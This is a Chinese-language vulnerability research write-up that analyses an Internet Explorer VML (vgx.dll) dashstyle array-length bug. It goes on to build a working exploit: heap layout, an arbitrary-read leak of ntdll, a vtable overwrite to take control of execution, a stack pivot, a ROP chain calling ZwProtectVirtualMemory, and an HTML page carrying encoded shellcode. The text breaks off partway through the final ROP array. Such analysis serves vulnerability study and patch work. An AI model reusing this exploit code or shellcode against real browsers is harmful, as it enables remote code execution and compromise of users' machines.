a3)观察参数可以知道，a2是将要访问的偏移。注意到在IDA中的if判断，首先调用了ORG::CElements，若其返回值小于a2，则执行vgx!ORG::Get函数直觉告诉我们这里便是一个关键点所在，我们跟进ORG::CElements函数查看细节。123456789101112131415161718192021222324vgx!ORG::CElements:70a2d079 8bff mov edi,edi70a2d07b 55 push ebp70a2d07c 8bec mov ebp,esp70a2d07e 8b4508 mov eax,dword ptr [ebp+8]70a2d081 0fb74004 movzx eax,word ptr [eax+4]70a2d085 5d pop ebp70a2d086 c20400 ret 4--------------------------------------------------------------------------------0:005&gt; geax=1b190fe8 ebx=70a84964 ecx=70a17258 edx=0473bd24 esi=1b398ff0 edi=0473c2f4eip=70a2d07e esp=0473bd2c ebp=0473bd2c iopl=0 nv up ei pl nz ac po cycs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000213vgx!ORG::CElements+0x5:70a2d07e 8b4508 mov eax,dword ptr [ebp+8] ss:0023:0473bd34=1b190fe80:005&gt; dd 1b190fe8 l81b190fe8 70a17258 002cffff 00040004 000001011b190ff8 1a3fcf50 d0d0d0d0 ???????? ????????0:005&gt; peax=1b190fe8 ebx=70a84964 ecx=70a17258 edx=0473bd24 esi=1b398ff0 edi=0473c2f4eip=70a2d081 esp=0473bd2c ebp=0473bd2c iopl=0 nv up ei pl nz ac po cycs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000213vgx!ORG::CElements+0x8:70a2d081 0fb74004 movzx eax,word ptr [eax+4] ds:0023:1b190fec=ffff可以看到，代码从一个vgx!ORG对象中取出了0xffff，其中movzx说明是将其作为无符号数对待的。当函数返回后，0xffff将会和a2进行比较，但此时是有符号数比较，导致0xffff &lt; a2，从而调用vgx!ORG::Get根据POC中的代码，我们很容易猜到0xffff就是dashstyle数组（ORG数组）的长度，而vml1.dashstyle.array.length = 0 - 1;就是对长度进行修改的代码。此时我们已经大概了解的这个漏洞的原理，但还是没有追溯到修改数组长度的根源。接下来我们将要试图找到修改length的具体代码。漏洞根源因为在c++在创建对象的时候，会将对象的虚表地址拷贝到对象的内存中，所以我们在代码中搜索对vgx!ORG::&#39;vftable&#39;的引用，试图找到创建vgx!ORG对象的代码。可以看到，除了虚表本身以及两个ORG对象的成员函数外，只剩一个函数1signed int __stdcall MsoFCreateArray(__int16 a1, _DWORD *a2);在windbg中对其下断点1234567891011121314151617181920212223240:016&gt; bp vgx!MsoFCreateArray0:016&gt; gBreakpoint 7 hiteax=0485e9c8 ebx=0485ea30 ecx=0485ea30 edx=00000001 esi=0485ea34 edi=0485ea30eip=6e90d1df esp=0485e99c ebp=0485e9b0 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246vgx!MsoFCreateArray:6e90d1df 8bff mov edi,edi... //单步几次后0:005&gt; peax=0485e9c8 ebx=0485ea30 ecx=0485ea30 edx=00000001 esi=0485ea34 edi=00000101eip=6e90d1ee esp=0485e988 ebp=0485e998 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246vgx!MsoFCreateArray+0xf:6e90d1ee e88a67fdff call vgx!operator new (6e8e397d)0:005&gt; peax=1d66efe8 ebx=0485ea30 ecx=00000014 edx=00000000 esi=0485ea34 edi=00000101eip=6e90d1f3 esp=0485e988 ebp=0485e998 iopl=0 nv up ei pl nz na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000206vgx!MsoFCreateArray+0x14:6e90d1f3 59 pop ecx0:005&gt; dd eax l81d66efe8 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c01d66eff8 c0c0c0c0 d0d0d0d0 ???????? ????????可以发现这里创建了一个vgx!ORG对象，我们对它的length所在地址下内存断点，来观察其值的变化。123456789101112131415161718192021222324252627282930313233343536370:005&gt; ba w2 eax+40:005&gt; gBreakpoint 8 hiteax=1d66efec ebx=0485ea30 ecx=00000000 edx=00000004 esi=1d66efe8 edi=00000101eip=6e94c07e esp=0485e978 ebp=0485e978 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246vgx!MsoFInitPx+0x11:6e94c07e 8b4d14 mov ecx,dword ptr [ebp+14h] ss:0023:0485e98c=000001010:005&gt; g; dd 1d66efe8 l8Breakpoint 8 hit1d66efe8 6e8f7258 00040001 00040004 000001011d66eff8 1d670ff0 d0d0d0d0 ???????? ????????0:005&gt; g; dd 1d66efe8 l8Breakpoint 8 hit1d66efe8 6e8f7258 00040002 00040004 000001011d66eff8 1d670ff0 d0d0d0d0 ???????? ????????0:005&gt; g; dd 1d66efe8 l8Breakpoint 8 hit1d66efe8 6e8f7258 00040003 00040004 000001011d66eff8 1d670ff0 d0d0d0d0 ???????? ????????...0:005&gt; g; dd 1d66efe8 l8Breakpoint 8 hit1d66efe8 6e8f7258 002c002c 00040004 000001011d66eff8 1cbe2f50 d0d0d0d0 ???????? ????????0:005&gt; g; dd 1d66efe8 l8Breakpoint 8 hit1d66efe8 6e8f7258 002cffff 00040004 000001011d66eff8 1cbe2f50 d0d0d0d0 ???????? ????????0:005&gt; kbChildEBP RetAddr Args to Child 0485ee34 6e94c7c6 1d66efec ffffffff 0000002d vgx!MsoFRemovePx+0xaa0485ee4c 6e90cf79 1d66efec ffffffff 0000002d vgx!MsoDeletePx+0x150485ee60 6e95dbac 1d66efe8 ffffffff 0000002d vgx!ORG::DeleteRange+0x170485ee8c 764a3ec3 1d66efe8 ffffffff 0793efa4 vgx!COALineDashStyleArray::put_length+0xd70485eea8 764a3d3d 1d896ff0 00000030 00000004 OLEAUT32!DispCallFunc+0x1650485ef38 6e9447c1 07e4b454 1d896ff0 00000000 OLEAUT32!CTypeInfo2::Invoke+0x23f可以看到，length的值首先从0递增到0x2c，然后被修改为了0xffff通过栈回溯可以注意到vgx!COALineDashStyleArray::put_length函数，从函数名就可以猜测到这是一个修改length值的函数。重新运行，对该函数下断123456789100:015&gt; bp vgx!COALineDashStyleArray::put_length0:005&gt; gBreakpoint 7 hiteax=0000000a ebx=70a84964 ecx=70a7dad5 edx=09648fea esi=06297ec0 edi=046deca4eip=70a7dad5 esp=046dec58 ebp=046dec70 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202vgx!COALineDashStyleArray::put_length:70a7dad5 8bff mov edi,edi0:005&gt; dd esp l4046dec58 764a3ec3 1d958ff0 ffffffff 09648fa4同时使用IDA查看函数代码12345678910111213141516171819202122232425int __stdcall COALineDashStyleArray::put_length(struct COAProg **this, int a2)&#123; ... if ( v10 &gt;= 0 ) &#123; ... v7 = (*(*this + 11))(this); //vgx!ORG::CElements() if ( v7 &gt;= a2 ) &#123; (*(*this + 10))(this, a2, v7 - a2); //vgx!ORG::DeleteRange(ORG *this, int a2, int a3) goto LABEL_2; &#125; v8 = a2 - v7; v9 = operator new(4 * (a2 - v7)); ... memset(v9, 0, 4 * v8); if ( !(*(*this + 6))(this, v9, v8) ) //vgx!ORG::FAppendRange(int a1, void *Src, int a3) v10 = 0x80004005; operator delete(v9); &#125;LABEL_2: v3 = v10; COAError::~COAError(&amp;v10); return v3;&#125;首先通过调试可以知道，参数a2的值为0xffffffff，也就是我们想要设置的length。ida中的几个函数指针分别为如上所示。通过ida反编译的代码我们就可以将整个程序逻辑理解清楚了。首先使用vgx!ORG::CElements()获取当前的长度值(0x2c)，放入v7中v7与参数a2进行比较，这里同样也是有符号数的比较，v7 &gt; a2调用ORG::DeleteRange并直接跳转到LABEL_2，退出函数而程序的正常流程本应该为v7 &lt; v2，重新分配内存v9 = operator new(4 * (a2 - v7))调用ORG::FAppendRange函数，并退出函数。到此，我们完成了对poc触发crash完整流程的分析。漏洞利用分析此时注意关闭hpa选项信息泄露这里参考了Danny__Wei的博客VML shape的_vgRuntimeStyle属性由COARuntimeStyle对象负责处理，当访问_vgRuntimeStyle.marginLeft时，对应的COARuntimeStyle::put_marginLeft()或者COARuntimeStyle::get_marginLeft()函数就会被调用当第一次访问marginLeft/rotation属性，那么在put_marginLeft/put_rotation函数中会调用CVMLShape::GetRTSInfo -&gt; CParserTag::GetRTSInfo来创建一个COARuntimeStyle对象，该对象大小为0xAC（实际分配0xB0）而marginLeft属性的值对应的字符串指针就保存在该COARuntimeStyle对象的0x58偏移处。可以通过get_marginLeft函数来访问该属性因为我们拥有让dashstyle数组（ORG数组）越界访问的能力那么，如果可以将COARuntimeStyle对象布局到一个dashstyle数组后方，我们就可以修改其中的marginLeft值对应的字符串指针。这样，当我们再次读取marginLeft值的时候，就可以任意地址读取了。相关代码为了达到这样的效果，我们这里首先创建大量的VML shape对象1234567function createRects()&#123; for(var i=0; i&lt;0x400; i++)&#123; rect_array[i] = document.createElement("v:shape") rect_array[i].id = "rect" + i.toString() document.body.appendChild(rect_array[i]) &#125;&#125;然后依次访问_vgRuntimeStyle.rotation，以此来创建大量的COARuntimeStyle对象(0xB0字节)并且在创建的中途创建一个包含44个元素的dashstyle数组（ORG数组），该数组大小与COARuntimeStyle对象一致，使之可以与其相邻。12345678910for (var i=0; i&lt;0x400; i++)&#123; a[i] = document.getElementById("rect" + i.toString())._vgRuntimeStyle; //获取_vgRuntimeStyle属性&#125;for (var i=0; i&lt;0x400; i++)&#123; a[i].rotation; //第一次访问rotation属性，创建COARuntimeStyle对象 大小为0xAC(0xB0) 在偏移为0x58处为marginLeft if (i == 0x300) &#123; //在COARuntimeStyle中间创建一个包含44个元素的dashstyle数组（ORG数组），分配4*44 = 0xb0大小的空间 vml1.dashstyle = "1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44" &#125;&#125;在布局成功后，越界访问修改marginLeft指针(偏移为0x16*4=0x58)，然后再次读取marginLeft，从而泄露数据。这里选择通过固定地址0x7ffe0300泄露出ntdll.dll的基址。通过固定地址泄露的方法在后期补丁之后无法利用，可以选择泄露COARuntimeStyle对象的虚表指针从而计算出vgx.dll基址,然后通过读取PE头来获取IAT表来得到ntdll.dll的基址，具体可参考文章12345678910111213141516var length_orig = vml1.dashstyle.array.length;vml1.dashstyle.array.length = 0 - 1; //修改lengthfor (var i = 0; i &lt; 0x400; i++)&#123; marginLeftAddress_orgin = vml1.dashstyle.array.item(0x2E+0x16); //0x2E = dashstyle长度 + COARuntimeStyle对象堆块头部(8字节) a[i].marginLeft = "hpasserby" marginLeftAddress_modify = vml1.dashstyle.array.item(0x2E+0x16); if (marginLeftAddress_orgin != marginLeftAddress_modify) &#123; //判断该对象是否紧邻于dashstyle数组 vml1.dashstyle.array.item(0x2E+0x16) = 0x7ffe0300; //修改指针 var leak = a[i].marginLeft; ntdllbase = parseInt(leak.charCodeAt(1).toString(16) + leak.charCodeAt(0).toString(16), 16) - 0x464F0; alert("ntdllbase: 0x" + ntdllbase.toString(16)); vml1.dashstyle.array.item(0x2E+0x16) = marginLeftAddress_orgin; break; &#125;&#125;调试笔记首先在vgx!MsoFCreateArray下断，查看vgx!ORG对象的地址，然后运行到vgx!COARuntimeStyle::put_marginLeft1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768690:005&gt; bu vgx!MsoFCreateArray+0x140:005&gt; bu vgx!COARuntimeStyle::put_marginLeft0:005&gt; gBreakpoint 0 hiteax=03f02690 ebx=0265e5d8 ecx=00000014 edx=02040048 esi=0265e5dc edi=00000101eip=6d82d1f3 esp=0265e530 ebp=0265e540 iopl=0 nv up ei pl nz na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000206vgx!MsoFCreateArray+0x14:6d82d1f3 59 pop ecx0:005&gt; dd 3f02690 l803f02690 000001c6 00000000 00000000 0000000003f026a0 00000000 00000000 2156f9af 800000000:005&gt; gBreakpoint 2 hiteax=0000000a ebx=6d8852d0 ecx=6d880286 edx=001493e2 esi=0265ed48 edi=0265ea84eip=6d880286 esp=0265ea38 ebp=0265ea50 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202vgx!COARuntimeStyle::put_marginLeft:6d880286 8bff mov edi,edi0:005&gt; dd 3f02690 l803f02690 6d817258 002cffff 00040004 0000010103f026a0 03f32b80 00000000 2156f9af 800000000:005&gt; dd 03f32b80 l10003f32b80 00000001 00000002 00000003 0000000403f32b90 00000005 00000006 00000007 0000000803f32ba0 00000009 0000000a 0000000b 0000000c03f32bb0 0000000d 0000000e 0000000f 0000001003f32bc0 00000011 00000012 00000013 0000001403f32bd0 00000015 00000016 00000017 0000001803f32be0 00000019 0000001a 0000001b 0000001c03f32bf0 0000001d 0000001e 0000001f 0000002003f32c00 00000021 00000022 00000023 0000002403f32c10 00000025 00000026 00000027 0000002803f32c20 00000029 0000002a 0000002b 0000002c03f32c30 214948dc 8c000000 01400018 0000000003f32c40 00000000 00000000 00000000 0000000003f32c50 00000000 00000000 00000000 0000000003f32c60 00000000 00000000 00000000 0000000003f32c70 00000000 00000000 00000000 0000000003f32c80 00000000 00000000 00000000 0000000003f32c90 00000000 00000000 00000000 0000000003f32ca0 00000000 00000000 00000000 0000000003f32cb0 00000000 00000000 00000000 0000000003f32cc0 00000000 00000000 00000000 0000000003f32cd0 00000000 00000000 00000000 0000000003f32ce0 00000001 00000000 214948c7 8c00000003f32cf0 01400018 00000000 00000000 0000000003f32d00 00000000 00000000 00000000 0000000003f32d10 00000000 00000000 00000000 0000000003f32d20 00000000 00000000 00000000 0000000003f32d30 00000000 00000000 00000000 0000000003f32d40 00000000 00000000 00000000 0000000003f32d50 00000000 00000000 00000000 0000000003f32d60 00000000 00000000 00000000 0000000003f32d70 00000000 00000000 00000000 0000000003f32d80 00000000 00000000 00000000 0000000003f32d90 00000000 00000000 00000001 0000000003f32da0 214948ee 8c000000 01400018 0000000003f32db0 00000000 00000000 00000000 0000000003f32dc0 00000000 00000000 00000000 0000000003f32dd0 00000000 00000000 00000000 0000000003f32de0 00000000 00000000 00000000 0000000003f32df0 00000000 00000000 00000000 0000000003f32e00 00000000 00000000 00000000 0000000003f32e10 00000000 00000000 00000000 0000000003f32e20 00000000 00000000 00000000 0000000003f32e30 00000000 00000000 00000000 0000000003f32e40 00000000 00000000 00000000 00000000...可以观察到数组后方已经成功布局上了COARuntimeStyle对象继续运行，浏览器弹窗时断下，查看内存123456789101112131415161718192021222324250:005&gt; dd 03f32b80 l10003f32b80 00000001 00000002 00000003 0000000403f32b90 00000005 00000006 00000007 0000000803f32ba0 00000009 0000000a 0000000b 0000000c03f32bb0 0000000d 0000000e 0000000f 0000001003f32bc0 00000011 00000012 00000013 0000001403f32bd0 00000015 00000016 00000017 0000001803f32be0 00000019 0000001a 0000001b 0000001c03f32bf0 0000001d 0000001e 0000001f 0000002003f32c00 00000021 00000022 00000023 0000002403f32c10 00000025 00000026 00000027 0000002803f32c20 00000029 0000002a 0000002b 0000002c03f32c30 214948dc 8c000000 01400018 0000000003f32c40 00000000 00000000 00000000 0000000003f32c50 00000000 00000000 00000000 0000000003f32c60 00000000 00000000 00000000 0000000003f32c70 00000000 00000000 00000000 0000000003f32c80 00000000 00000000 00000000 0000000003f32c90 7ffe0300 00000000 00000000 0000000003f32ca0 00000000 00000000 00000000 000000000:008&gt; ln poi(7ffe0300) (778d64f0) ntdll!KiFastSystemCall | (778d64f4) ntdll!KiFastSystemCallRetExact matches: ntdll!KiFastSystemCall (&lt;no parameter info&gt;)...可见地址0x03f32c90处的地址已经被修改为7ffe0300，通过获取marginLeft就可读取处ntdll.dll中的地址。劫持eip当读取_anchorRect属性时，内部会调用”vgx!COAShape::get__anchorRect()”，最终创建并返回一个0x10大小的COAReturnedPointsForAnchor对象。释放_anchorRec元素时，会调用虚表函数所以，我们可以通过与前面相同得布局方式，通过溢出修改COAReturnedPointsForAnchor对象的虚表指针，从而在释放该对象时获取程序控制权。相关代码123456789101112131415161718192021function exploit()&#123; var vml1 = document.getElementById("vml1") for(var i = 0; i &lt; 0x400; i++)&#123; a[i] = document.getElementById("rect" + i.toString())._anchorRect; if (i == 0x300)&#123; vml1.dashstyle = "1 2 3 4"; //与COAReturnedPointsForAnchor对象大小保持一致 &#125; &#125; vml1.dashstyle.array.length = 0 - 1; vml1.dashstyle.array.item(6) = 0x41414141; //覆盖虚表指针 for (var i=0; i&lt;0x400; i++) &#123; delete a[i]; CollectGarbage(); &#125; alert("done");&#125;调试笔记123456789101112131415160:005&gt; g(fa4.a14): Access violation - code c0000005 (first chance)First chance exceptions are reported before any exception handling.This exception may be expected and handled.eax=06f8a6b0 ebx=01f12460 ecx=41414141 edx=0000008a esi=01f12460 edi=00000009eip=76494974 esp=0247ef14 ebp=0247ef20 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010202OLEAUT32!VariantClear+0xb6:76494974 ff5108 call dword ptr [ecx+8] ds:0023:41414149=????????0:005&gt; dd eax-2006f8a690 6cc5ecf8 8800c248 00000001 0000000206f8a6a0 00000003 00000004 6cc5ecff 8800019406f8a6b0 41414141 06f3d9d0 00000001 0000000006f8a6c0 6cc5ecf2 88008cd5 6e895504 06f3dab006f8a6d0 00000001 00000000 6cc5ecf1 8800c1b4...ROP因为我们拥有获取字符串地址的能力，所以这里不需要使用堆喷技术。将shellcode作为marginLeft的值，即可通过读取marginLeft指针泄露出它的地址。然后根据泄露出来的地址生成rop链，同样的方法将生成的rop链写入marginLefe并泄露出地址。最后劫持eip到rop链上布置payload1234567891011121314151617181920212223242526272829303132333435363738394041424344454647function leak()&#123; var vml1 = document.getElementById("vml1") for (var i = 0; i &lt; 0x400; i++)&#123; a[i] = document.getElementById("rect" + i.toString())._vgRuntimeStyle; &#125; for (var i = 0; i &lt; 0x400; i++)&#123; a[i].rotation; if (i == 0x300) &#123; vml1.dashstyle = "1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44" &#125; &#125; var length_orig = vml1.dashstyle.array.length; vml1.dashstyle.array.length = 0 - 1; for (var i = 0; i &lt; 0x400; i++)&#123; marginLeftAddress_orgin = vml1.dashstyle.array.item(0x2E+0x16); a[i].marginLeft = unescape("shellcode"); marginLeftAddress_modify = vml1.dashstyle.array.item(0x2E+0x16); if (marginLeftAddress_orgin != marginLeftAddress_modify) &#123; vml1.dashstyle.array.item(0x2E+0x16) = 0x7ffe0300; var leak = a[i].marginLeft; vml1.dashstyle.array.item(0x2E+0x16) = marginLeftAddress_orgin; //第一次泄露 var shelladdr = marginLeftAddress_modify; ntdllbase = parseInt(leak.charCodeAt(1).toString(16) + leak.charCodeAt(0).toString(16), 16) - 0x464F0; alert("ntdllbase: 0x" + ntdllbase.toString(16)); alert("shelladdr: 0x" + shelladdr.toString(16)); //根据shellcode的地址生成rop链 //第二次泄露 var rop_chain = tab2uni(get_ropchain(shelladdr)); a[i].marginLeft = rop_chain; rop_addr = vml1.dashstyle.array.item(0x2E+0x16); vml1.dashstyle.array.item(0x2E+0x16) = marginLeftAddress_orgin; vml1.dashstyle.array.length = length_orig; alert("ropaddr: 0x" + rop_addr.toString(16)); break; &#125; &#125;&#125;栈转移前面劫持eip部分可以看到，最后的调用是call dword ptr [ecx+8]而在我们的gadget中没有xchg ecx,esp，所以这意味着没办法直接将栈转移到我们的rop链上。但是我们可以通过越界访问，先在COAReturnedPointsForAnchor对象所在堆上布置好一些gadget然后利用xchg eax,esp; pop;这种gadget，让esp先转移到堆上，然后由堆上的gadget再将栈转移到我们的rop链上。相关代码12345678910111213141516171819202122232425262728293031pivot = [ ntdllbase + Number(0x0001cecb), //# RETN ntdllbase + Number(0x0001da87), //# POP EBX # RETN ntdllbase + Number(0x00046B13), //# XCHG EAX,ESP # POP ESI # POP EDI # LEA EAX,DWORD PTR DS:[EDX-1] # POP EBX # RETN]function exploit()&#123; var vml1 = document.getElementById("vml1") for(var i = 0; i &lt; 0x400; i++)&#123; a[i] = document.getElementById("rect" + i.toString())._anchorRect; if (i == 0x300)&#123; vml1.dashstyle = "1 2 3 4"; &#125; &#125; var length_orig = vml1.dashstyle.array.length; vml1.dashstyle.array.length = 0 - 1; vml1.dashstyle.array.item(6) = rop_addr; //在堆上布置gadget vml1.dashstyle.array.item(8) = rop_addr; //rop_addr -&gt; ebx vml1.dashstyle.array.item(9) = ntdllbase + 0x000cb0f8; //# MOV ESP,EBX # POP EBX # RETN for (var i=0; i&lt;0x400; i++) &#123; delete a[i]; CollectGarbage(); &#125; alert("done");&#125;代码分析由call dword ptr [ecx+8]可以知道，首先执行的是rop第三句交换eax和esp，栈被转移到堆上，esp指向vml1.dashstyle.array.item(6)pop esi; pop edi，esp移动到vml1.dashstyle.array.item(8)pop ebx，将vml1.dashstyle.array.item(8)中的值存入ebx，即rop_addr -&gt; ebxretn，程序返回到esp指向的vml1.dashstyle.array.item(9)执行布置在堆上的gadgetmov esp,ebx，因为ebx中使rop链的地址，栈被成功转移到rop链上。pop ebx，esp指向rop链第二句执行rop链第二句，POP EBX，将第三句弹出，防止再次栈转移rop链这里我们主要利用ntdll.dll中的ntdll!ZwProtectVirtualMemory函数来修改内存的属性。要求的寄存器环境为1234567edi -&gt; ZwProtectVirtualMemoryesi -&gt; return_addressebp -&gt; 0xffffffffesp -&gt; ptr to BaseAddressebx -&gt; ptr to NumberOfBytesToProtectedx -&gt; 0x00000040ecx -&gt; ptr to OldAccessProtection这里ptr to OldAccessProtection可以是任意可写地址，将被用来存放以前的保护属性。我们注意到，其中还存在另外2个指针数据，所以这就要求我们先将数据存储到内存中，再将其地址取出来。所以这里我选择先将数据存储到ntdll.dll的data段，因为这里具有固定的偏移0xD7000，且内存可写。123456789101112131415161718192021222324252627282930310:005&gt; !dh ntdll......SECTION HEADER #1 .text name ... Execute Read...SECTION HEADER #2 RT name ... Execute ReadSECTION HEADER #3 .data name 806C virtual size D7000 virtual address ... Read WriteSECTION HEADER #4 .rsrc name ... Read OnlySECTION HEADER #5 .reloc name ... Read Only相关代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748function get_ropchain(shelladdr)&#123; var data_off = 0x000D7000 + 0x2000; var arr = [ ntdllbase + Number(0x0001cecb), //# RETN ntdllbase + Number(0x0001da87), //# POP EBX # RETN ntdllbase + Number(0x00046B13), //# XCHG EAX,ESP # POP ESI # POP EDI # LEA EAX,DWORD PTR DS:[EDX-1] # POP EBX # RETN ntdllbase + Number(0x0006D4F3), //# POP EAX # OR DH,DH # RETN ntdllbase + Number(data_off), //buf1 -&gt; eax ntdllbase + Number(0x000468e0), //# POP EDX # RETN Number(shelladdr), //BaseAddress-&gt; edx ntdllbase + Number(0x000CA46F), //# MOV DWORD PTR DS:[EAX],EDX # POP EBP # RETN 0x90909090, ntdllbase + Number(0x0006D4F3), //# POP EAX # OR DH,DH # RETN ntdllbase + Number(data_off+0x4), //buf2 -&gt; eax ntdllbase + Number(0x000468e0), //# POP EDX # RETN 0x00010400, //NumberOfBytesToProtect -&gt; edx ntdllbase + Number(0x000CA46F), //# MOV DWORD PTR DS:[EAX],EDX # POP EBP # RETN 0x90909090, ntdllbase + Number(0x0006D4F3), //# POP EAX # OR DH,DH # RETN ntdllbase + Number(data_off-0x4), //buf3 -&gt; eax ntdllbase + Number(0x000468e0), //# POP EDX # RETN ntdllbase + Number(0x000C3C64), //# PUSHAD # RETN ntdllbase + Number(0x000CA46F), //# MOV DWORD PTR DS:[EAX],EDX # POP EBP # RETN 0x90909090, ntdllbase + Number(0x00034b9a), //# POP EDI # RETN ntdllbase + Number(0x00045360), //ZwProtectVirtualMemory -&gt; edi ntdllbase + Number(0x0001da87), //# POP EBX # RETN ntdllbase + Number(data_off+0x4), //ptr to NumberOfBytesToProtect -&gt; ebx ntdllbase + Number(0x0006D4F3), //# POP EAX # OR DH,DH # RETN 0x8b37c4da, ntdllbase + Number(0x000576DA), //# ADD EAX,74C83B66 # RETN ntdllbase + Number(0x00008cbb), //# XCHG EAX,EDX # ADD AL,0 # POP ESI # POP EBP # RETN 0x04 (0x00000040 -&gt; edx) Number(shelladdr), //return address -&gt; esi 0xffffffff, //0xffffffff -&gt; ebp ntdllbase + Number(0x000614e8), //# POP ECX # RETN 0x90909090, ntdllbase + Number(data_off+0x8), //ptr to OldAccessProtection -&gt; ecx ntdllbase + Number(0x00037B20), //# POP ESP # RETN ntdllbase + Number(data_off-0x4), //ptr to BaseAddress -&gt; esp 0x90909090, 0x90909090 ]; return arr;&#125;代码分析前三句是栈转移代码通过MOV DWORD PTR DS:[EAX],EDX，分别将BaseAddress、NumberOfBytesToProtect写入到buf1和buf2buf3中存储的是指令PUSHAD; RETN的地址，因为在rop最后我们会将buf3的地址写入esp，导致栈转移到buf中。因为不能出现0x0000这种数据，所以在将0x00000040写入edx时需要做一些处理。这里先将0x8b37c4da写入eax，然后将eax加上0x74C83B66，数据溢出后恰好是0x40，这就避免了0x0000的出现。完整利用123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162&lt;html lang="zh"&gt; &lt;head&gt; &lt;meta http-equiv="x-ua-compatible" content="IE=EmulateIE9" &gt; &lt;/head&gt; &lt;title&gt;hpasserby&lt;/title&gt; &lt;style&gt;v\: * &#123; behavior:url(#default#VML); display:inline-block &#125;&lt;/style&gt; &lt;xml:namespace ns="urn:schemas-microsoft-com:vml" prefix="v" /&gt; &lt;body&gt; &lt;v:oval&gt; &lt;v:stroke id="vml1"/&gt; &lt;/v:oval&gt; &lt;/body&gt; &lt;script&gt; var rect_array = new Array(); var a = new Array(); var rop_addr; var ntdllbase; function createRects()&#123; for(var i=0; i&lt;0x400; i++)&#123; rect_array[i] = document.createElement("v:shape"); rect_array[i].id = "rect" + i.toString(); document.body.appendChild(rect_array[i]); &#125; &#125; function leak()&#123; var vml1 = document.getElementById("vml1"); for (var i = 0; i &lt; 0x400; i++)&#123; a[i] = document.getElementById("rect" + i.toString())._vgRuntimeStyle; &#125; for (var i = 0; i &lt; 0x400; i++)&#123; a[i].rotation; if (i == 0x300) &#123; vml1.dashstyle = "1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44" &#125; &#125; var length_orig = vml1.dashstyle.array.length; vml1.dashstyle.array.length = 0 - 1; for (var i = 0; i &lt; 0x400; i++)&#123; marginLeftAddress_orgin = vml1.dashstyle.array.item(0x2E+0x16); a[i].marginLeft = unescape("%uc933%u8b64%u3041%u408b%u8b0c%u1470%u96ad%u8bad%u1058%u538b%u033c%u8bd3%u7852%ud303%u728b%u0320%u33f3%u41c9%u03ad%u81c3%u4738%u7465%u7550%u81f4%u0478%u6f72%u4163%ueb75%u7881%u6408%u7264%u7565%u8be2%u2472%uf303%u8b66%u4e0c%u8b49%u1c72%uf303%u148b%u038e%u33d3%u53c9%u5152%u6168%u7972%u6841%u694c%u7262%u4c68%u616f%u5464%uff53%u83d2%u0cc4%u5059%u6651%u6cb9%u516c%u7268%u2e74%u6864%u736d%u6376%uff54%u83d0%u10c4%u548b%u0424%uc933%ub951%u6d65%u6162%u8351%u246c%u6103%u6c83%u0224%u6862%u7973%u7473%u5054%ud2ff%uc483%u5510%uec8b%uec83%u3304%ubef6%u6d63%u0064%u7589%u8dfc%ufc75%uff56%u83d0%u08c4%u5a5e%ub95b%u7365%u6173%u8351%u246c%u6103%u5068%u6f72%u6863%u7845%u7469%u5354%ud2ff%uc933%uff51%u5fd0%u5b5e%uc481%u00c0%u0000%uec3b%u81e8%uff6a%u8bff%u5de5%u00c3"); marginLeftAddress_modify = vml1.dashstyle.array.item(0x2E+0x16); if (marginLeftAddress_orgin != marginLeftAddress_modify) &#123; vml1.dashstyle.array.item(0x2E+0x16) = 0x7ffe0300; var leak = a[i].marginLeft; vml1.dashstyle.array.item(0x2E+0x16) = marginLeftAddress_orgin; var shelladdr = marginLeftAddress_modify; ntdllbase = parseInt(leak.charCodeAt(1).toString(16) + leak.charCodeAt(0).toString(16), 16) - 0x464F0; alert("ntdllbase: 0x" + ntdllbase.toString(16)); alert("shelladdr: 0x" + shelladdr.toString(16)); var rop_chain = tab2uni(get_ropchain(shelladdr)); a[i].marginLeft = rop_chain; rop_addr = vml1.dashstyle.array.item(0x2E+0x16); vml1.dashstyle.array.item(0x2E+0x16) = marginLeftAddress_orgin; vml1.dashstyle.array.length = length_orig; alert("ropaddr: 0x" + rop_addr.toString(16)); break; &#125; &#125; &#125; function get_ropchain(shelladdr)&#123; var data_off = 0x000D7000 + 0x2000; var arr = [ ntdllbase + Number(0x0001cecb), //# RETN ntdllbase + Number(0x0001da87), //# POP EBX # RETN ntdllbase + Number(0x00046B13), //# XCHG EAX,ESP # POP ESI # POP EDI # LEA EAX,DWORD PTR DS:[EDX-1] # POP EBX # RETN ntdllbase + Number(0x0006D4F3), //# POP EAX # OR DH,DH # RETN ntdllbase + Number(data_off), //buf1 -&gt; eax ntdllbase + Number(0x000468e0), //# POP EDX # RETN Number(shelladdr), //BaseAddress-&gt; edx ntdllbase + Number(0x000CA46F), //# MOV DWORD PTR DS:[EAX],EDX # POP EBP # RETN 0x90909090, ntdllbase + Number(0x0006D4F3), //# POP EAX # OR DH,DH # RETN ntdllbase + Number(data_off+0x4), //buf2 -&gt; eax ntdllbase + Number(0x000468e0), //# POP EDX # RETN 0x00010400, 